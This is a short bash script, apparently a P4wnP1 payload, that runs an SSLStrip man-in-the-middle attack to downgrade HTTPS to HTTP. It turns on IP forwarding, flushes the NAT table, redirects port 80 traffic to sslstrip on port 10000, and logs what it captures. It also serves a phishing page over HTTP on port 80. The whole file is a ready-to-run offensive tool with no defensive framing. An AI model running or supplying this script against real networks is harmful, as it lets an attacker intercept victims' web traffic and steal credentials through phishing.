#!/bin/bash
# Description: SSLStrip + phishing proxy to downgrade HTTPS to HTTP

set -euo pipefail

# === Config ===
PAYLOAD_NAME="sslstrip_phishing"
LOG_DIR="/opt/p4wnp1/logs"
WEB_ROOT="/opt/p4wnp1/www"
SSLSTRIP_LOG="$LOG_DIR/${PAYLOAD_NAME}_sslstrip.log"
WEB_LOG="$LOG_DIR/${PAYLOAD_NAME}_web.log"

mkdir -p "$LOG_DIR" "$WEB_ROOT"
exec > >(tee -a "$LOG_DIR/${PAYLOAD_NAME}.log") 2>&1

echo "[*] Starting SSLStrip phishing attack at $(date)"

# === Requirements check ===
if ! command -v sslstrip >/dev/null 2>&1; then
  echo "[!] sslstrip not found. Install it with: pip install sslstrip"
  exit 1
fi

# === Kill existing services ===
pkill -f sslstrip || true
pkill -f "python3 -m http.server" || true
sleep 1

# === Enable forwarding + redirect 80 → 10000 ===
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -F
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 10000

# === Launch sslstrip ===
echo "[+] Starting SSLStrip on port 10000"
sslstrip -l 10000 -w "$SSLSTRIP_LOG" &

# === Serve phishing site ===
echo "[+] Hosting phishing page from $WEB_ROOT"
cd "$WEB_ROOT"
python3 -m http.server 80 > "$WEB_LOG" 2>&1 &

echo "[✓] SSLStrip phishing running. Logs in $LOG_DIR"
